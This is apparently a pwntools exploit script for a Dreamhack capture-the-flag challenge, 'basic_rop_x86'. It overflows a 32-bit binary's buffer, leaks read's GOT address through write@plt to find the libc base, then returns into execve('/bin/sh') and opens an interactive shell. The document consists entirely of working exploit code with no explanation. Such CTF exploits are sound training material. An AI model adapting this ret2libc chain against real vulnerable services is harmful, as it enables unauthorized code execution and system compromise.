from pwn import *

context.update(log_level='debug')
#p = remote('host1.dreamhack.games', 12385)
p = process('basic_rop_x86')
#libc = ELF('libc.so.6')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
elf = ELF('basic_rop_x86')
offset_system = libc.symbols['system']
offset_execve = libc.symbols['execve']
offset_read = libc.symbols['read']
log.info('offset_read: ' + hex(offset_read))
addr_got_read = elf.got['read']
addr_plt_write = elf.plt['write']
addr_main = elf.symbols['main']


#p.recvrepeat(1)

payload = 'a'*0x48 + p32(addr_plt_write) + p32(addr_main) + p32(1) + p32(addr_got_read) + p32(4)
p.sendline(payload)
p.recv(0x40)
addr_libc_read = u32(p.recv(999)[-4:])
log.info('addr_libc_read: ' + hex(addr_libc_read))
addr_libc_base = addr_libc_read - offset_read
log.info('addr_libc_base: ' + hex(addr_libc_base))
addr_libc_system = addr_libc_base + offset_system
log.info('addr_libc_system: ' + hex(addr_libc_system))
addr_libc_execve = addr_libc_base + offset_execve
log.info('offset_execve: ' + hex(offset_execve))
log.info('addr_libc_execve: ' + hex(addr_libc_execve))

addr_libc_binsh = addr_libc_base + list(libc.search('/bin/sh'))[0]
log.info('addr_libc_binsh: ' + hex(addr_libc_binsh))
payload = 'a'*0x48 + p32(addr_libc_execve) + p32(0) + p32(addr_libc_binsh) + p32(0)*4
#payload = 'a'*0x48 + p32(addr_main) + p32(0) + p32(addr_libc_binsh) + p32(0)*4
raw_input('debug: ' + str(p.pid))
p.sendline(payload)
#p.recvrepeat(1)
p.recv(999)


p.interactive()
